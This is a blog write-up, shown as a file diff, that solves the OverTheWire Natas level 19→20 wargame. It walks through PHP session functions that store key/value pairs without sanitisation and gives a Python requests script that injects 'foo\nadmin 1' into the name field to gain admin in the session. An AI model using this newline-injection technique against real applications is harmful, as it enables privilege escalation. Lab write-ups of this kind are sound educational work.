@@ -1,0 +1,93 @@
+---
+layout: post
+title:  "Natas Level 19 → Level 20"
+date:   2021-05-29 21:34:21
+categories: ctf wargames web-security
+tags: wargames ctf overthewire web-security
+series: "OverTheWire: Natas"
+excerpt: Write to own
+mathjax: false
+---
+
+## Level Goal
+Excluding the URL and username, the Level Goal section is blank for the Natas ctf.
+
+
+## Solution
+This level starts with us logged in. We have a form that is intended to let us change out name and a link to the source code. The source for this level is too long. I'll highlight the the more important sections. 
+
+Additionally, due to the way this level was put together, I'll be testing the code from Python instead of the Developer Tools. This is due to the level requiring use of the provided debug via GET, and the submission of data via POST. All results are printed via Debug which is not rendered to the webpage, but to the Request tab under the Network tab. To pass this level, multiple loads of the page are required. Not only is this too much hassle, but the testing via Python will result in us getting the password and as a final script.
+
+Let's look at a few sections of the code.
+
+Below we see what is needed for the application to consider us an admin.
+- A session id must exist
+- One of the keys to be "admin"
+- The admin key must be set to "1"
+
+```php
+function print_credentials() { 
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+        ...
+```
+
+The myread function checks to see if we have a save session file, if we don't it creates one. It then reads the contents of that file. It uses spaces as delimiters and takes two entries at a time. These are then read in as a key/value. There is no sanitization.
+
+```php
+function myread($sid) { 
+    ...
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        ...
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    ...
+```
+
+The mywrite function reads the save session file. It takes the values in $_SESSION and stores them two-at-a-time with a space delimiter, and ends with a newline. There is no sanitization.
+
+```php
+function mywrite($sid, $data) { 
+    ...
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    ...
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+```
+
+Looking over the list of what we need to do to become admin, we only need to exploit mywrite to create the key-value pair. The session id was created for us automatically when we first entered the site. The only way to see the password for the next level is to trigger the myread function while using debug. Let's create the script.
+
+
+```python
+#!/usr/bin/env python
+import requests
+from requests.auth import HTTPBasicAuth
+
+password = 'e------------------------------F'
+session = requests.Session()
+auth = HTTPBasicAuth('natas20', password)
+url = 'http://natas20.natas.labs.overthewire.org/index.php?debug'
+
+
+def write_kvpair(key, value):
+    resp = session.post(url=url, data={key: value}, auth=auth)
+    print(resp.text)
+
+
+def load_page():
+    resp = session.get(url=url, auth=auth)
+    print(resp.text)
+
+
+
+write_kvpair("name", "foo\nadmin 1")
+load_page()
+```
+
